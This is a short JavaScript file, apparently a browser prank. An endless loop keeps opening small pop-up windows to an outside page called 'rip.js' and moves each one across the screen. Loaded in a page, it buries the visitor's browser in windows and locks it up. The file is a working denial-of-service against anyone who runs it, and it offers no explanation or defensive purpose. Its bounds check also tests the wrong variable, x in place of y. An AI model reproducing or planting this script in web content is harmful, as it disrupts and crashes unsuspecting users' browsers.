var myWindow
var leftOrRight = false
var upOrDown = false

var x = Math.random() * 1000
var y = Math.random() * 1000

var name = "0"
while (0 < 10) {
	if (leftOrRight == true) {
		x = x - 20
	} else {
		x = x + 20
	}

	if (upOrDown == true) {
		y = y - 20
	} else {
		y = y + 20
	}

	if (x < 0) {
		leftOrRight = false
	} else if (x > 1200) {
		leftOrRight = true
	}

	if (y < 0) {
		upOrDown = false
	} else if (x > 400) {
		upOrDown = true
	}
	myWindow = window.open("https://toastersploit.github.io/rip.js/", "", "width=150, height=150");
	myWindow.moveTo(x, y);
}
